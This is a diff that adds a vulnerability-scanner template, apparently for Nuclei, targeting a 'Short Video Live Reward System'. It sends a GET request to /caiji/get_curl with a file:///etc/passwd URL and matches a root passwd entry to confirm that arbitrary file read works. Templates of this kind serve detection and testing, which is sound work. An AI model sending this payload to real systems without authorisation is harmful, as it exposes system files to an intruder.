@@ -1,0 +1,18 @@
+id: poc-yaml-short-video-reward-get-curl-fileread
+info:
+  name: Short Video Live Reward System Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+http:
+  - method: GET
+    path:
+      - "/caiji/get_curl?url=file:///etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
